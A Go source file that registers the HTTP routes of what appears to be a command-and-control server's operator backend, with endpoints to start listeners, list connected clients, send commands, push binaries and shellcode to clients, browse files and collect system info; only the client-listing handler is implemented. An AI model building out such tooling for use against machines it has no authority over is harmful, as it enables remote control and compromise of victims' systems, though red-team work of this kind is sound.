package handlers

import (
	"encoding/json"
	"github.com/Connduit/frazzledrip/server/backend/network"
	"github.com/Connduit/frazzledrip/server/backend/utils"
	"net/http"
)

// NOTE: this function "connects" backend and frontend
func RegisterHandlers() {
	http.HandleFunc("/browse-files", browseFilesHandler)
	http.HandleFunc("/link-session", linkSessionHandler)
	http.HandleFunc("/stop-listener", stopListenerHandler)
	http.HandleFunc("/listener-status", listenerStatusHandler)
	http.HandleFunc("/disconnect-session", disconnectSessionHandler)
	// Start listener endpoint
	http.HandleFunc("/start-listener", startListenerHandler)

	// Get connected clients
	http.HandleFunc("/get-clients", getClientsHandler)

	// Get messages from a specific client
	http.HandleFunc("/get-client-messages", getClientMessagesHandler)

	// Send command to client
	http.HandleFunc("/send-command", sendCommandHandler)

	// TODO
	// Send MY command to client
	http.HandleFunc("/my-send-command", mySendCommandHandler)

	// Send file to client
	http.HandleFunc("/send-binary", sendBinaryHandler)

	// Send shellcode to client
	http.HandleFunc("/send-shellcode", sendShellcodeHandler)

	// Get client system info
	http.HandleFunc("/get-client-info", getClientInfoHandler)
}

func getClientsHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	clients := network.GetAllClients()
	json.NewEncoder(w).Encode(clients)
}
